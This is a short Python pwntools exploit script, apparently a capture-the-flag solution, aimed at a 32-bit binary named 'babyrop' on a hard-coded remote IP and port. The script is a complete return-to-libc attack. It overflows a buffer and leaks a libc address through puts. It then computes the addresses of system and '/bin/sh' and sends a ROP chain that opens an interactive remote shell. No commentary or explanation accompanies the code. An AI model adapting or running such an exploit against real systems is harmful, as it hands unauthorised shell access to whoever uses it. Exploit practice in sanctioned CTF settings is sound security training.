from pwn import * 
context.log_level = 'debug'
#p = process('./babyrop')
p = remote('47.112.137.238',13337)
elf=ELF('libc-2.23.so')
pelf = ELF('babyrop')
puts_addr = pelf.plt['puts']
payload = "\x00"*2 + "\xff"*0x1e
p.send(payload)
p.recv()
exp = "A"*0xe7+ "A"*4  + p32(puts_addr) +p32(0x08048825) +p32(pelf.got['__libc_start_main'])
p.send(exp)
__libc_addr = u32(p.recv()[0:4])
libc_base = __libc_addr - elf.symbols['__libc_start_main']
print hex(libc_base)
bin_addr=libc_base +next(elf.search("/bin/sh"))
sys_addr = libc_base + elf.symbols['system']
p.send(payload)
p.recv()
exp2 = "A"*0xe3+"/bin/sh\x00" + p32(sys_addr) +p32(0x8048825) + p32(bin_addr)
#gdb.attach(p)
p.send(exp2)
p.interactive()


